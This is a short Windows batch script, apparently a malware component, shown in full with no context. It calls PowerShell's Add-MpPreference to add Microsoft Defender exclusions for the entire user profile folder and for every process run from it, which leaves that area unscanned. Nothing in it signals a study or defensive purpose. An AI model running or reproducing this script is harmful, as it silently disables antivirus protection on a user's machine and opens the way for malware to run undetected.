@echo off
cmd /c powershell -Command Add-MpPreference -ExclusionPath '%USERPROFILE%'
cmd /c powershell -Command Add-MpPreference -ExclusionProcess '%USERPROFILE%\*'
